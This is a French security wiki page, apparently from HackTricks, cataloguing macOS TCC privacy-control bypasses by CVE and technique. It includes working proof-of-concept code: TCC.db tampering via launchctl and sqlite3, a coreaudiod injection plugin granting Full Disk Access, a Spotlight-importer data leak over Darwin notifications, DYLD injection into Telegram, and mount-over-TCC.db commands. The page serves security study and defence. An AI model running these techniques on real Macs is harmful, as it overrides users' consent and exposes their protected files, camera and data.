# Contournements de macOS TCC

{{#include ../../../../../banners/hacktricks-training.md}}

Pour le stockage des autorisations TCC et l’attribution de l’expéditeur et de la cible d’Automation, consultez la [présentation de macOS TCC](../index.html#identify-apple-events-sender-and-target-grants).

## Par fonctionnalité

### Write Bypass

Ce n’est pas un contournement, c’est simplement ainsi que fonctionne TCC : **il n’empêche pas l’écriture**. Si Terminal **n’a pas accès en lecture au bureau d’un utilisateur, il peut quand même y écrire** :

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

L’**attribut étendu `com.apple.macl`** est ajouté au nouveau **fichier** pour donner à l’**app créatrice** le droit de le lire.<sup>[[2]](#references)</sup>

### TCC ClickJacking

Il est possible de **placer une fenêtre par-dessus l’invite TCC** pour faire **accepter** la demande à l’utilisateur sans qu’il s’en aperçoive. Vous trouverez un PoC dans [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### Requête TCC par nom arbitraire

Un attaquant peut **créer des apps portant n’importe quel nom** (par exemple Finder, Google Chrome...) dans **`Info.plist`** et leur faire demander l’accès à un emplacement protégé par TCC. L’utilisateur pensera que c’est l’application légitime qui demande cet accès.\
De plus, il est possible de **retirer l’app légitime du Dock et d’y placer la fausse**, de sorte que lorsque l’utilisateur clique sur cette dernière (qui peut utiliser la même icône), elle appelle l’app légitime, demande les autorisations TCC et exécute un malware, faisant croire à l’utilisateur que l’app légitime a demandé l’accès.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Plus d’informations et un PoC :

{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Par défaut, un accès via **SSH disposait de « Full Disk Access »**. Pour le désactiver, il faut qu’il figure dans la liste, mais qu’il soit désactivé (le supprimer de la liste ne supprimera pas ces privilèges) :<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: By default an access via SSH used to have "Full Disk Access" . In order to disable this you need to have it listed but disabled (removing it...](<../../../../../images/image (1077).png>)

Vous trouverez ici des exemples de **malwares ayant réussi à contourner cette protection** :

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> Notez que désormais, pour pouvoir activer SSH, vous devez disposer de **Full Disk Access**

### Gestion des extensions - CVE-2022-26767

L’attribut **`com.apple.macl`** est attribué aux fichiers pour donner à une **application donnée l’autorisation de les lire.** Cet attribut est défini lorsqu’un utilisateur **glisse-dépose** un fichier sur une app ou **double-clique** sur un fichier pour l’ouvrir avec l’**application par défaut**.

Un utilisateur pourrait donc **enregistrer une app malveillante** pour gérer toutes les extensions et appeler Launch Services afin d’**ouvrir** n’importe quel fichier (l’app malveillante se verra ainsi accorder l’accès en lecture au fichier).<sup>[[23]](#references)</sup>

### iCloud

Le droit **`com.apple.private.icloud-account-access`** permet de communiquer avec le service XPC **`com.apple.iCloudHelper`**, qui **fournira des tokens iCloud**.

**iMovie** et **Garageband** disposaient de ce droit et d’autres droits qui le permettaient.

Pour plus d’**informations** sur l’exploit permettant d’**obtenir des tokens iCloud** grâce à ce droit, consultez la présentation : [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### Fuite de données via les noms de notification Darwin des importateurs Spotlight

Un importateur Spotlight peut lire le fichier que Spotlight transmet à son callback `GetMetadataForFile`, même si un processus normal sans Full Disk Access ne peut pas le lire. Contrairement à [l’injection de code dans un processus autorisé par TCC](../macos-tcc-credential-and-data-theft.md), cette technique nécessite un foothold local permettant d’installer un importateur et un événement d’indexation Spotlight correspondant. L’importateur est sandboxé, mais les notifications Darwin dont seul le nom est utilisé peuvent transporter des octets vers un listener situé hors de ce sandbox. Il s’agit d’un canal de data-leak, et non d’un moyen pour l’importateur d’obtenir les privilèges root ou un accès arbitraire aux fichiers.<sup>[[24]](#references)</sup>

Déclarez le type de fichier cible sous `CFBundleDocumentTypes` → `LSItemContentTypes` dans le `Info.plist` de l’importateur, puis installez le bundle dans `~/Library/Spotlight/` ou dans le répertoire `Contents/Library/Spotlight/` d’une app. Vérifiez l’enregistrement avec `mdimport -L`. La [section consacrée aux importateurs Spotlight](../../../../macos-auto-start-locations.md#spotlight-plugins) décrit l’emplacement des bundles et la correspondance des types de fichiers. L’importateur ne reçoit que les fichiers pour lesquels Spotlight le sélectionne ; un importateur existant a généralement la priorité. Sous macOS 26 Tahoe, `mdimport -i` ne forçait pas de manière fiable l’indexation récursive immédiate lors des tests rapportés, tandis que `mdimport -r ~/Library/Spotlight/Spotlight.mdimporter` demandait la réimportation des UTI revendiqués par cet importateur.<sup>[[24]](#references)</sup>

Pour tester le canal, démarrez un listener hors du sandbox avec `notifyutil -w TEST_TEST_TEST`, puis publiez une notification avec `CFNotificationCenterGetDarwinNotifyCenter()` et un objet et un `userInfo` égaux à `NULL`. Contrairement à une notification distribuée avec une charge utile `userInfo`, la notification Darwin ne contient que son nom. Pour les données binaires, enregistrez le listener externe pour les noms décimaux `0` à `255` avec `notify_register_dispatch` ; associez chaque enregistrement du callback à sa valeur d’octet. Dans `GetMetadataForFile`, lisez uniquement le `pathToFile` fourni par Spotlight et envoyez chaque octet sous forme de nom de notification décimal :<sup>[[24]](#references)</sup>

```objectivec
NSData *data = readBytes(pathToFile); // helper reading Spotlight's selected file
const uint8_t *bytes = data.bytes;
for (NSUInteger i = 0; i < data.length; i++) {
    CFStringRef name = CFStringCreateWithFormat(NULL, NULL,
                                                 CFSTR("%u"), bytes[i]);
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(),
                                         name, NULL, NULL, true);
    CFRelease(name);
}
```

Le listener reconstruit la séquence d’octets au lieu de lire lui-même le fichier protégé par TCC. Le PoC publié a récupéré les 64 premiers octets de `knowledgeC.db` depuis un terminal sans FDA, avec SIP activé, sur macOS 26. La bande passante est faible et cette méthode n’est pas fiable pour copier de grandes quantités de données : Spotlight peut ne pas indexer ou réindexer un fichier cible, et des instances d’importateur exécutées simultanément peuvent entrelacer les flux de notifications. Consultez [macOS Sandbox Debug & Bypass](../../macos-sandbox/macos-sandbox-debug-and-bypass/) pour découvrir d’autres mécanismes de contournement des limites du sandbox.<sup>[[24]](#references)</sup>

### kTCCServiceAppleEvents / Automation

Une application disposant de la permission **`kTCCServiceAppleEvents`** pourra **contrôler d’autres applications**. Cela signifie qu’elle pourrait **abuser des permissions accordées aux autres applications**.<sup>[[2]](#references)</sup>

Pour plus d’informations sur les Apple Scripts, consultez :

{{#ref}}
macos-apple-scripts.md
{{#endref}}

Par exemple, si une application dispose de la **permission Automation sur `iTerm`**, comme dans cet exemple où **`Terminal`** a accès à iTerm :

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Via iTerm

Terminal, qui ne dispose pas de FDA, peut appeler iTerm, qui en dispose, et l’utiliser pour effectuer des actions :

```applescript:iterm.script
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```

```bash
osascript iterm.script
```

#### Via Finder

Ou si une application dispose d’un accès via Finder, elle pourrait exécuter un script tel que celui-ci :

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## Selon le comportement de l’application

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Le **daemon tccd** en espace utilisateur utilisait la variable **`HOME`** **env** pour accéder à la base de données TCC de l’utilisateur dans : **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Selon [cette publication sur Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), et comme le daemon TCC s’exécute via `launchd` dans le domaine de l’utilisateur actuel, il est possible de **contrôler toutes les variables d’environnement** qui lui sont transmises.<sup>[[19]](#references)</sup>\
Ainsi, un **attaquant pourrait définir la variable d’environnement `$HOME`** dans **`launchctl`** pour qu’elle pointe vers un **répertoire** **contrôlé**, **redémarrer** le daemon **TCC**, puis **modifier directement la base de données TCC** afin de s’octroyer **toutes les autorisations TCC disponibles**, sans jamais demander confirmation à l’utilisateur final.<sup>[[1]](#references)</sup>\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notes

Notes avait accès aux emplacements protégés par TCC, mais une note nouvellement créée était **stockée dans un emplacement non protégé**. Un attaquant pouvait donc demander à Notes de copier un fichier protégé dans une note, puis accéder aux données obtenues depuis l’emplacement non protégé :

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Le binaire `/usr/libexec/lsd`, avec la bibliothèque `libsecurity_translocate`, avait l’entitlement `com.apple.private.nullfs_allow`, qui lui permettait de créer un montage **nullfs**, ainsi que l’entitlement `com.apple.private.tcc.allow` avec **`kTCCServiceSystemPolicyAllFiles`** pour accéder à tous les fichiers.

Il était possible d’ajouter l’attribut de quarantaine à « Library », d’appeler le service XPC **`com.apple.security.translocation`**, puis celui-ci montait Library sur **`$TMPDIR/AppTranslocation/d/d/Library`**, où tous les documents de Library pouvaient être **accédés**.

### CVE-2024-44131 - FileProvider symlink race

Les applications qui délèguent les opérations sur les fichiers à un **helper privilégié** (ici, **`fileproviderd`** / `Files.app`) copient ou déplacent des éléments **pour le compte de l’utilisateur**. La copie s’exécute donc avec les privilèges du helper, et non ceux de l’appelant.

Jamf Threat Labs a montré que la validation des symlinks effectuée avant l’opération peut être **contournée par une race condition** : au lieu de placer le symlink sur le **dernier** composant du chemin (qui est vérifié), l’attaquant remplace un répertoire **intermédiaire** du chemin **après le début de la copie**. Le helper privilégié suit alors le lien contrôlé par l’attaquant et lit/écrit dans des emplacements protégés par TCC **sans jamais afficher de prompt**.<sup>[[5]](#references)</sup>

Les répertoires dont le chemin n’est **pas** protégé par un UUID aléatoire (par exemple `~/Library/Mobile Documents/com~apple~CloudDocs`) sont les cibles les plus faciles, car l’attaquant peut prédire le chemin complet pour provoquer la race condition.

> [!TIP]
> Voici le schéma générique à rechercher : **tout processus privilégié qui résout un chemin plusieurs fois** (vérification puis utilisation, ou `rename()`/`copyfile()` qui résout séparément la source et la destination) peut subir une race condition si un répertoire au milieu du chemin est remplacé. Seuls `O_NOFOLLOW_ANY`, `openat()` sur un FD de répertoire déjà ouvert, ou `realpath()` suivi d’une nouvelle validation permettent réellement de fermer cette fenêtre.

Plus d’informations dans [**l’article de Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` peut être compilé avec `SQLITE_ENABLE_SQLLOG`, ce qui ajoute un hook de journalisation contrôlé par des variables d’environnement ([`test_sqllog.c` en amont](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)) :<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – pour **chaque base de données ouverte**, une **copie du fichier de base de données** ainsi qu’un journal des instructions SQL sont écrits dans `path` (le répertoire doit déjà exister).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – créer une **nouvelle copie à chaque ouverture ou rattachement** d’une base de données, au lieu d’en réutiliser une.
- **`SQLITE_SQLLOG_CONDITIONAL`** – ne journaliser une connexion que si un fichier `<database>-sqllog` existe à côté de la base de données principale.

Si vous pouvez injecter cette variable dans un processus qui dispose de **FDA** et ouvre des bases de données SQLite, celui-ci **copiera volontiers ces bases de données protégées** dans un répertoire que vous contrôlez. Comme le nom du fichier de destination est dérivé de données contrôlées par l’attaquant, un **symlink placé à destination** transforme cette même primitive en **écriture arbitraire de fichier** avec les privilèges du processus cible.

### **SQLITE_AUTO_TRACE**

Si la variable d’environnement **`SQLITE_AUTO_TRACE`** est définie, la bibliothèque **`libsqlite3.dylib`** commence à **journaliser** toutes les requêtes SQL. De nombreuses applications utilisaient cette bibliothèque, ce qui permettait de journaliser toutes leurs requêtes SQLite.<sup>[[22]](#references)</sup>

Plusieurs applications Apple utilisaient cette bibliothèque pour accéder à des informations protégées par TCC.

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### Recherche d’écritures de fichiers déclenchées par des variables d’environnement

Les deux entrées précédentes sont des exemples d’une même technique générique, et il vaut la peine d’en chercher d’autres : **les frameworks chargés dans des apps disposant de privilèges TCC exposent souvent des variables d’environnement de débogage/journalisation qui amènent le processus à créer un fichier à un chemin contrôlé par l’appelant**.

Procédure pour les trouver :

1. Choisissez une cible avec un accès complet au disque (FDA) ou une autre permission TCC intéressante (`Music`, `TV`, `Terminal`, des agents MDM...) et listez les frameworks auxquels elle est liée (`otool -L`, `vmmap`).
2. Recherchez les chaînes `getenv` dans ces frameworks : `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Définissez les variables candidates avec `launchctl setenv NAME /path/you/control`, lancez l’app et observez son activité sur le système de fichiers avec `fs_usage -w -f filesys <pid>` ou `sudo fs_usage | grep <path>`.
4. Si le processus **crée ou renomme** un fichier dans votre répertoire, vous disposez d’une primitive d’écriture : faites pointer la destination vers un lien symbolique (ou mettez en course un répertoire intermédiaire, comme dans CVE-2024-44131 ci-dessus) pour rediriger l’écriture vers `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Deux facteurs limitent cette technique. Premièrement, les variables **`DYLD_*` sont ignorées pour les binaires à hardened runtime**, sauf si l’app possède le droit [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) (« une valeur booléenne qui indique si l’app peut être affectée par des variables d’environnement du linker dynamique, qui peuvent servir à injecter du code dans le processus de l’app ») — voir aussi [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Deuxièmement, Apple supprime les variables de débogage de frameworks au fur et à mesure qu’elles sont signalées ; une variable qui fonctionnait sur une version de macOS a souvent disparu sur la suivante. Si une app refuse silencieusement de se lancer après que vous en avez défini une, considérez que cette variable est déjà filtrée.<sup>[[7]](#references)[[8]](#references)</sup>

Consultez [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) pour découvrir l’astuce équivalente utilisant des variables du linker.

### Apple Remote Desktop

En tant que root, vous pouvez activer ce service ; **l’agent ARD disposera alors d’un accès complet au disque**, ce qu’un utilisateur pourrait exploiter pour lui faire copier une nouvelle **base de données utilisateur TCC**.

## Par **NFSHomeDirectory**

TCC utilise une base de données située dans le dossier HOME de l’utilisateur pour contrôler l’accès aux ressources qui lui sont propres, à l’emplacement **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Par conséquent, si l’utilisateur parvient à redémarrer TCC avec une variable d’environnement $HOME pointant vers un **autre dossier**, il pourrait créer une nouvelle base de données TCC dans **/Library/Application Support/com.apple.TCC/TCC.db** et inciter TCC à accorder n’importe quelle permission TCC à n’importe quelle app.

> [!TIP]
> Apple utilise la valeur du paramètre **`NFSHomeDirectory`** stocké dans le profil de l’utilisateur comme valeur de **`$HOME`**. Ainsi, si vous compromettez une application autorisée à modifier cette valeur (**`kTCCServiceSystemPolicySysAdminFiles`**), vous pouvez **armer** cette option pour contourner TCC.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Le **premier POC** utilise [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) et [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) pour modifier le dossier **HOME** de l’utilisateur.

1. Récupérez un blob _csreq_ pour l’app cible.
2. Déposez un faux fichier _TCC.db_ contenant les accès requis et le blob _csreq_.
3. Exportez l’entrée Directory Services de l’utilisateur avec [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Modifiez l’entrée Directory Services pour changer le répertoire personnel de l’utilisateur.
5. Importez l’entrée Directory Services modifiée avec [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Arrêtez le _tccd_ de l’utilisateur et redémarrez le processus.

Le second POC utilisait **`/usr/libexec/configd`**, qui possédait `com.apple.private.tcc.allow` avec la valeur `kTCCServiceSystemPolicySysAdminFiles`.\
Il était possible de lancer **`configd`** avec l’option **`-t`**, ce qui permettait à un attaquant de spécifier un **Bundle personnalisé à charger**. L’exploit **remplace** donc la méthode **`dsexport`** et **`dsimport`** de modification du répertoire personnel de l’utilisateur par une **injection de code dans `configd`**.

Pour plus d’informations, consultez le [**rapport original**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>

## Par injection de processus

Il existe différentes techniques pour injecter du code dans un processus et exploiter ses privilèges TCC :


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

De plus, la méthode d’injection de processus la plus couramment utilisée pour contourner TCC passe par des **plugins (chargement de bibliothèques)**.\
Les plugins sont du code supplémentaire, généralement sous forme de bibliothèques ou de fichiers plist, qui sera **chargé par l’application principale** et s’exécutera dans son contexte. Par conséquent, si l’application principale avait accès à des fichiers soumis aux restrictions TCC (grâce à des permissions ou des droits accordés), le **code personnalisé y aura également accès**.

### CVE-2020-27937 - Directory Utility

L’application `/System/Library/CoreServices/Applications/Directory Utility.app` possédait le droit **`kTCCServiceSystemPolicySysAdminFiles`**, chargeait des plugins avec l’extension **`.daplug`** et **n’utilisait pas le hardened runtime**.

Pour armer cette CVE, on **modifie** **`NFSHomeDirectory`** (en exploitant le droit mentionné précédemment) afin de **prendre le contrôle de la base de données TCC de l’utilisateur** et de contourner TCC.

Pour plus d’informations, consultez le [**rapport original**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Le binaire **`/usr/sbin/coreaudiod`** possédait les droits `com.apple.security.cs.disable-library-validation` et `com.apple.private.tcc.manager`. Le premier **autorise l’injection de code** et le second lui donne accès à la **gestion de TCC**.

Ce binaire permettait de charger des **plugins tiers** depuis le dossier `/Library/Audio/Plug-Ins/HAL`. Il était donc possible de **charger un plugin et d’exploiter les permissions TCC** à l’aide de ce POC :<sup>[[13]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

    add_tcc_entry();

    NSLog(@"[+] Exploitation finished...");
    exit(0);
```

Pour plus d’informations, consultez le [**rapport original**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>

### Plug-ins de la couche d’abstraction des périphériques (DAL)

Les applications système qui ouvrent un flux de caméra via Core Media I/O (applications avec **`kTCCServiceCamera`**) chargent **ces plug-ins dans leur processus** depuis `/Library/CoreMediaIO/Plug-Ins/DAL` (non soumis aux restrictions de SIP).

Il suffit d’y déposer une bibliothèque avec un **constructeur** classique pour **injecter du code**.

Plusieurs applications Apple étaient vulnérables à cela.

### Firefox

L’application Firefox disposait des autorisations `com.apple.security.cs.disable-library-validation` et `com.apple.security.cs.allow-dyld-environment-variables` :<sup>[[14]](#references)</sup>

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```

Pour plus d’informations sur la façon de l’exploiter facilement, [**consultez le rapport original**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

Le binaire `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` disposait des entitlements **`com.apple.private.tcc.allow`** et **`com.apple.security.get-task-allow`**, ce qui permettait d’injecter du code dans le processus et d’utiliser les privilèges TCC.

### CVE-2023-26818 - Telegram

Telegram disposait des entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** et **`com.apple.security.cs.disable-library-validation`** ; il était donc possible d’en abuser pour **accéder à ses autorisations**, par exemple pour enregistrer des vidéos avec la caméra. Vous pouvez [**trouver le payload dans le writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Notez que, pour utiliser la variable d’environnement afin de charger une bibliothèque, un **fichier plist personnalisé** a été créé pour injecter cette bibliothèque, puis **`launchctl`** a été utilisé pour la lancer :<sup>[[15]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.telegram.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/telegram.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/telegram.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## Par des invocations de open

Il est possible d’invoquer **`open`** même en étant sandboxé.

### Scripts Terminal

Il est assez courant d’accorder un accès complet au disque (Full Disk Access, FDA) à Terminal, au moins sur les ordinateurs utilisés par des personnes du milieu technique. Il est également possible d’invoquer des scripts **`.terminal`** avec cet accès.

Les scripts **`.terminal`** sont des fichiers plist comme celui-ci, avec la commande à exécuter dans la clé **`CommandString`** :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

Une application pourrait écrire un script de terminal dans un emplacement tel que /tmp et le lancer avec une commande comme :

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## By mounting

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Tout utilisateur** (même non privilégié) peut créer et monter un instantané Time Machine, et **accéder à TOUS les fichiers** de cet instantané.\
La **seule condition privilégiée** requise est que l’application utilisée (comme `Terminal`) dispose de l’accès **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), qui doit lui être accordé par un administrateur.<sup>[[2]](#references)</sup>

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```

Une explication plus détaillée est [**disponible dans le rapport original**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - Monter par-dessus le fichier TCC

Même si le fichier TCC DB était protégé, il était possible de **monter un nouveau fichier TCC.db par-dessus le répertoire** :

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
    os.system("mkdir /tmp/mnt")
    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

Consultez l'**exploit complet** dans le [**writeup original**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>

### CVE-2024-40855

Comme expliqué dans le [writeup original](https://www.kandji.io/blog/macos-audit-story-part2), cette CVE exploitait `diskarbitrationd`.<sup>[[16]](#references)</sup>

La fonction `DADiskMountWithArgumentsCommon` du framework public `DiskArbitration` effectuait les contrôles de sécurité. Cependant, il était possible de les contourner en appelant directement `diskarbitrationd` et donc d'utiliser des éléments `../` dans le chemin ainsi que des liens symboliques.

Cela permettait à un attaquant d'effectuer des montages arbitraires à n'importe quel emplacement, y compris par-dessus la base de données TCC, grâce à l'entitlement `com.apple.private.security.storage-exempt.heritable` de `diskarbitrationd`.

### asr

L'outil **`/usr/sbin/asr`** permettait de copier le disque entier et de le monter ailleurs, en contournant les protections TCC.

### CVE-2022-22655 - Services de localisation

Les Services de localisation ne sont **pas** stockés dans une base de données TCC comme les autres services. Ils sont gérés par `locationd`, qui conserve sa propre liste d'autorisation dans **`/var/db/locationd/clients.plist`** :<sup>[[4]](#references)</sup>

```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```

Chaque entrée est indexée par le client (ID de bundle ou chemin de l’exécutable) et contient des champs tels que `Authorized`, `BundleId`, `Executable` et `Registered`.<sup>[[4]](#references)</sup>

